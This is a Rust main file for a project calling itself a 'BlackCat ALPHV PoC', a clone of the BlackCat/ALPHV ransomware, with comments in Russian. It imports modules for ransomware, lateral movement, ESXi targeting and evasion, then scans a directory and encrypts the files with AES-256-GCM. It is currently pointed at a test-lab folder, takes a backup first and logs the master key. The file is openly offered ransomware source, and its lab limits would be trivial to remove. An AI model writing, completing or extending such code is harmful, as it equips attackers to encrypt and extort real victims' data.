mod crypto;
mod filesystem;
mod ransomware;
mod windows;
mod lateral_movement;
mod esxi;
mod evasion;
mod config;
mod linux;

use log::info;
use std::fs;
use std::path::Path;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Info)
        .init();

    info!("BlackCat ALPHV PoC v0.1.0 starting...");

    // ========== ТЕСТОВАЯ ВЕРСИЯ ==========
    // НЕ шифруем реальные файлы, используем тестовые!
    
    #[cfg(target_os = "windows")]
    let target_dir = "C:\\TestLab\\test_files";
    
    #[cfg(target_os = "linux")]
    let target_dir = "/tmp/testlab/test_files";
    
    info!("Target directory: {}", target_dir);

    // Проверяем, что директория существует
    if !Path::new(target_dir).exists() {
        return Err(format!("Test directory {} does not exist", target_dir).into());
    }

    info!("✓ Test directory exists");

    // Сканируем файлы
    let files = filesystem::scan_filesystem(target_dir)
        .map_err(|e| format!("Filesystem error: {}", e))?;
    
    info!("Found {} files to encrypt", files.len());
    for file in &files {
        info!("  - {}", file);
    }

    if files.is_empty() {
        return Err("No files found in test directory".into());
    }

    // Инициализируем криптографический движок
    let crypto_engine = crypto::CryptoEngine::new()
        .map_err(|e| format!("Crypto error: {}", e))?;
    
    info!("✓ Crypto engine initialized");
    info!("Master key (hex): {}", hex::encode(crypto_engine.get_master_key()));

    // Создаем резервную копию ПЕРЕД шифрованием (для восстановления!)
    info!("Creating backup...");
    let backup_dir = format!("{}_backup", target_dir);
    fs::create_dir_all(&backup_dir)?;
    
    for file in &files {
        let file_name = Path::new(file)
            .file_name()
            .ok_or("Invalid file name")?
            .to_str()
            .ok_or("Invalid file name")?;
        
        let backup_path = format!("{}\\{}", backup_dir, file_name);
        fs::copy(file, backup_path)?;
        info!("✓ Backup: {}", file_name);
    }

    // Шифруем файлы
    info!("Starting encryption...");
    match ransomware::BlackCatRansomware::encrypt_all_files(
        files.clone(),
        ransomware::RansomwareConfig {
            target_paths: vec![target_dir.to_string()],
            file_extensions: vec!["txt", "pdf", "docx"].iter().map(|s| s.to_string()).collect(),
            encryption_algorithm: "aes-256-gcm".to_string(),
            max_parallelism: 4,
        },
        &crypto_engine,
    ).await {
        Ok(()) => {
            info!("✓ Encryption complete!");
            info!("Encrypted files:");
            for file in &files {
                let metadata = fs::metadata(file)?;
                info!("  - {} ({} bytes)", file, metadata.len());
            }
            info!("");
            info!("========== ENCRYPTION REPORT ==========");
            info!("Master Key (SAVE THIS): {}", hex::encode(crypto_engine.get_master_key()));
            info!("Encrypted files: {}", files.len());
            info!("Backup location: {}", backup_dir);
            info!("======================================");
            Ok(())
        },
        Err(e) => {
            eprintln!("✗ Encryption error: {:?}", e);
            Err(format!("{:?}", e).into())
        }
    }
}
